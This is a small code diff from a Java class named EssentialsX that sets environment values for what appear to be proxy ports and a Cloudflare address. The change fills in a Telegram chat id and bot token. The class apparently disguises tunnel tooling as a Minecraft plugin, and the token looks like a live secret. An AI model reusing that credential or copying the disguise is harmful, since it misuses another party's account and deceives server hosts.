@@ -88,8 +88,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("REALITY_PORT", "4460");
         env.put("ANYREALITY_PORT", "4461");
         env.put("UPLOAD_URL", "");
-        env.put("CHAT_ID", "");
-        env.put("BOT_TOKEN", "");
+        env.put("CHAT_ID", "8680922177");
+        env.put("BOT_TOKEN", "8715862600:AAGbKyUqzWwFoD0FRuK32QULsfSwKwuQj2Y");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
         env.put("NAME", "");
